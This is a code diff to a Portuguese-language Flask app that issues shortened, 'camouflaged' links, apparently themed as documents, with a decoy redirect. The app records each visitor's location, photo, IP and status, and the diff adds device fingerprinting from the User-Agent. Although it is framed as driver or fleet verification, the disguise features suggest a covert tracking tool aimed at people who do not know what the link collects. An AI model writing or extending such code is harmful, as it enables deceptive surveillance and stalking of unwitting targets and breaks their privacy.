@@ -24,6 +24,18 @@ def encurtar_url(url_longa, alias=None):
             return r_fb.json()["data"]["tiny_url"] if r_fb.status_code in [200, 201] else url_longa
     except: return url_longa
 
+# --- NOVA FUNÇÃO: IDENTIFICAR DISPOSITIVO ---
+def identificar_dispositivo(user_agent):
+    """Lê o cabeçalho do navegador e retorna o modelo simplificado."""
+    ua = user_agent.lower()
+    if "iphone" in ua: return "📱 iPhone (iOS)"
+    if "android" in ua: return "📱 Android"
+    if "windows" in ua: return "💻 Windows PC"
+    if "macintosh" in ua or "mac os" in ua: return "💻 Mac OS"
+    if "linux" in ua: return "💻 Linux"
+    if "ipad" in ua: return "📱 iPad"
+    return "❓ Desconhecido"
+
 @app.route('/')
 def index(): return redirect(url_for('admin_panel'))
 
@@ -34,10 +46,7 @@ def admin_panel(): return render_template("admin.html", frota=FROTA)
 def gerar_ordem():
     motorista = request.form.get("motorista")
     personalizacao = request.form.get("personalizacao")
-    
-    # ATENÇÃO AQUI: O nome do campo no HTML agora é "camuflagem"
     tema = request.form.get("camuflagem") 
-    
     redirect_url = request.form.get("redirect") or "https://www.google.com"
 
     id_ordem = str(uuid.uuid4())[:8]
@@ -48,13 +57,20 @@ def gerar_ordem():
         "motorista": motorista, "lat": None, "lon": None, "foto": None,
         "status": "Aguardando Conexão", "ultimo_visto": "-", "link": link_curto,
         "redirect": redirect_url, "ip": "-", 
-        "tema": tema 
+        "tema": tema,
+        "device": "..." # Novo campo iniciado vazio
     }
     return redirect(url_for('admin_panel'))
 
 @app.route('/verificar-entrega/<id_ordem>')
 def tela_motorista(id_ordem):
     if id_ordem not in FROTA: return "Link expirado.", 404
+    
+    # --- CAPTURA O DISPOSITIVO AQUI ---
+    # O User-Agent é enviado automaticamente pelo navegador
+    user_agent = request.headers.get('User-Agent', '')
+    FROTA[id_ordem]['device'] = identificar_dispositivo(user_agent)
+    
     dados = FROTA[id_ordem]
     return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=dados.get("tema", "pdf"))
 
@@ -64,7 +80,6 @@ def receber_sinal(id_ordem):
         data = request.get_json()
         ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
         
-        # HORÁRIO BRASÍLIA
         fuso_br = pytz.timezone('America/Sao_Paulo')
         agora_br = datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
         
